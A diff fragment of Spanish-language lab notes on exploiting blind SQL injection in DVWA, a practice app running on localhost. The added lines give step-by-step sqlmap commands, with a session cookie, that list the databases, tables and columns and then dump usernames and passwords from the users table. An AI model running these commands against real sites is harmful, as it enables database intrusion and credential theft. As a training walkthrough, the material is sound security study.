@@ -23,7 +23,20 @@ indicando que la misma es vulnerable a ataques sql blind con tiempo definido
 --- Seleccionar user id:1 ---> submit
 
 ++ SQLMap
---- sqlmap -u 
+--- sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=medium" --data="id=1&Submit=Submit" --dbs
+---- Nos aparecerán las bases de datos disponibles: dvwa y information_schema
+---- Nota: En la sección de burp suite nos aparecen los datos asociados al enlace y al cookie, por ende podemos copiarlos en la terminal para ejecutar el comando de sqlmap
+---- A continuación procederemos a mostrar las tablas en la base de datos dvwa con el siguiente comando:
+----- sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=medium" --data="id=1&Submit=Submit" -D dvwa --tables
+---- A continuación procederemos a mostar las columnas de la tabla users de la base de datos dvwa con el siguiente comando:
+----- sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=medium" --data="id=1&Submit=Submit" -D dvwa -T users --columns 
+---- A continuación procederemos a mostrar los usuarios y las contraseñas asociadas a la tabla users de la base de datos dvwa con el siguiente comando:
+----- sqlmap -u "http://127.8.0.1/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0%23&Submit=Submit#" --cookie=PHPSESSID=<value>; security=medium" --data="id=1&Submit=Submit" -D dvwa -T users -C user,password -dump
+----- Presionar y 
+----- Presionar y
+
+
+
 
 
 
